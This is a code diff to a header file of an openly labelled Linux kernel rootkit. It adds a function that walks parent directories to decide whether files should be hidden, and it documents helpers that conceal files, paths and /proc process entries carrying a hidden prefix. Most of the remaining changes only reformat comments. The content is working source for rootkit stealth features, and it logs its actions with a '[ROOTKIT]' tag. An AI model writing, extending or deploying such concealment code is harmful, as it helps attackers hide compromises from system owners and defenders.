@@ -15,9 +15,11 @@
 // dirent.h lacks some includes, so we include it last
 #include <linux/dirent.h>
 
+#define LOOKUP_PARENTS 0x10000000 /* Lookup only parent directories */
+
 /**
  * Structure representing a directory entry (legacy; deprecated and removed from the kernel).
- * This is used to parse the output of the `getdents` syscall.
+ * @note This is used to parse the output of the `getdents` syscall.
  */
 typedef struct linux_dirent {
     unsigned long d_ino;     // Inode number
@@ -233,8 +235,8 @@ static inline bool is_filename_hidden(const char *const s_filename)
 
 /**
  * Does the given file name need to be hidden?
- * Checks if the file name starts with the hidden prefix,
- * or if it is a hidden PID folder in /proc/.
+ * @note Checks if the file name starts with the hidden prefix,
+ *       or if it is a hidden PID folder in /proc/.
  *
  * @param s_filename      The file name to check
  * @param b_is_proc_child Is the file a child of /proc/?
@@ -270,9 +272,34 @@ static inline bool is_filename_or_pid_hidden(const char *const s_filename,
 }
 
 /**
+ * Is one of the parent directories of the given path structure hidden?
+ * @note Does not check if the final component of the path is hidden.
+ *
+ * @param p_path The path structure to check
+ * @return `true` if one of the parent directories of the given path structure is hidden,
+ *         `false` otherwise
+ */
+static inline bool is_path_hierarchy_hidden(const path_t *const p_path)
+{
+    const dentry_t *p_parent = NULL; // dentry structure for parent directories
+
+    p_parent = p_path->dentry->d_parent;
+    while (!IS_ROOT(p_parent)) {
+        if (is_filename_hidden(p_parent->d_name.name)) {
+            pr_info("[ROOTKIT] * Parent directory is hidden: %s\n", p_parent->d_name.name);
+            return true;
+        }
+
+        p_parent = p_parent->d_parent;
+    }
+
+    return false;
+}
+
+/**
  * Does the given path need to be hidden?
- * Checks if the path is a process file/dir and needs to be hidden,
- * or if the file name starts with the hidden prefix.
+ * @note Checks if the path is a process file/dir and needs to be hidden,
+ *       or if the file name starts with the hidden prefix.
  *
  * @param p_path The path structure to check
  * @return `true` if the given path needs to be hidden, `false` otherwise
@@ -281,9 +308,9 @@ bool is_path_hidden(const path_t *const p_path);
 
 /**
  * Does the given pathname need to be hidden?
- * Checks if the pathname is a process file/dir and needs to be hidden,
- * or if the file name starts with the hidden prefix.
- * Path is checked twice: first with `AT_SYMLINK_NOFOLLOW`, then with `AT_SYMLINK_FOLLOW`.
+ * @note Checks if the pathname is a process file/dir and needs to be hidden,
+ *       or if the file name starts with the hidden prefix.
+ * @note Path is checked twice: first with `AT_SYMLINK_NOFOLLOW`, then with `AT_SYMLINK_FOLLOW`.
  *
  * @param i32_dfd          The file descriptor of the directory containing the pathname, or `AT_FDCWD`
  * @param s_pathname       The pathname to check
@@ -295,8 +322,8 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
 
 /**
  * Does the given file need to be hidden?
- * Checks if the file is a process file and needs to be hidden,
- * or if the file name starts with the hidden prefix.
+ * @note Checks if the file is a process file and needs to be hidden,
+ *       or if the file name starts with the hidden prefix.
  *
  * @param p_file The file structure to check
  * @return `true` if the given file needs to be hidden, `false` otherwise
@@ -320,7 +347,7 @@ const file_t *fd_get_file(const int i32_fd);
 
 /**
  * Gets the pathname of the given path struct.
- * The returned string must be freed with `kfree`/`kvfree`.
+ * @note The returned string must be freed with `kfree`/`kvfree`.
  *
  * @param p_path The path struct
  * @return The pathname of the given path struct
@@ -329,7 +356,7 @@ const char *path_get_pathname(const path_t *const p_path);
 
 /**
  * Gets the pathname of the given file struct.
- * The returned string must be freed with `kfree`/`kvfree`.
+ * @note The returned string must be freed with `kfree`/`kvfree`.
  *
  * @param p_file The file struct
  * @return The pathname of the given file struct
@@ -349,7 +376,7 @@ static inline const char *file_get_pathname(const file_t *const p_file)
 
 /**
  * Gets the pathname of the file associated with the given file descriptor.
- * The returned string must be freed with `kfree`/`kvfree`.
+ * @note The returned string must be freed with `kfree`/`kvfree`.
  *
  * @param i32_fd The file descriptor
  * @return The pathname of the file associated with the given file descriptor
